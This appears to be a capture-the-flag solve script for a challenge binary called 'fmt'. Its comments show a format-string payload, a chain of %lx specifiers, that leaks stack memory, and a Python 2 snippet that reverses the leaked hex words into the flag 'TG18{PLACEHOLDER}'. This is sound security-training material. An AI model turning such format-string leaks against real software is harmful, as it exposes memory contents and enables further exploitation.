import binascii

vals = ["414c507b38314754", "5245444c4f484543", "7d"]

print "".join(binascii.unhexlify(v)[::-1] for v in vals)

# $ ./fmt
# Give me your data please: %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
# Here you go: 7ffc9db5ada0.7f2fad5b1780.7f2fad2e2290.7f2fad7c1700.d.414c507b38314754.5245444c4f484543.7d.0.2e786c252e786c25.2e786c252e786c25
# $ python2 fmt.py
# TG18{PLACEHOLDER}
